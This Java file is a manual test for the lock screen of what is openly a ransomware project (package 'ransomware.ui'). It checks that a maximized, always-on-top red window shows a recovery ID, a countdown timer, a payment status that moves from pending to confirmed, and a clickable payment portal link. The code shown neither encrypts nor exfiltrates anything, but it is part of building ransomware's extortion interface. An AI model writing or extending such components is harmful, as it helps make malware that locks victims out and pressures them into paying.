package ransomware.ui;

import javax.swing.SwingUtilities;

/**
 * Manual smoke test for LockScreen.
 * Opens the window for 5 seconds then closes it.
 */
public class LockScreenTest {

    public static void main(String[] args) throws Exception {
        System.out.println("[Test] Creating LockScreen...");

        LockScreen lock = new LockScreen(
            "RCV-20260923-TESTUI",
            "PENDING",
            300  // 5 minutes = 300 seconds
        );

        SwingUtilities.invokeLater(lock::showWindow);
        System.out.println("[Test] LockScreen should now be visible.");
        System.out.println("[Test] Check that:");
        System.out.println("  - Window is maximized, undecorated, always-on-top");
        System.out.println("  - Red background with warning header");
        System.out.println("  - RecoveryID = RCV-20260923-TESTUI");
        System.out.println("  - Countdown starts at 05:00 and ticks down");
        System.out.println("  - Payment status = PENDING");
        System.out.println("  - Portal URL is clickable");
        System.out.println("  - Ctrl+Shift+Q closes the window");
        System.out.println();
        System.out.println("[Test] Auto-closing in 5 seconds...");

        Thread.sleep(5000);
        lock.updatePaymentStatus("CONFIRMED");
        System.out.println("[Test] Payment status updated to CONFIRMED");

        Thread.sleep(3000);
        lock.closeWindow();
        System.out.println("[Test] Window closed.");
        System.exit(0);
    }
}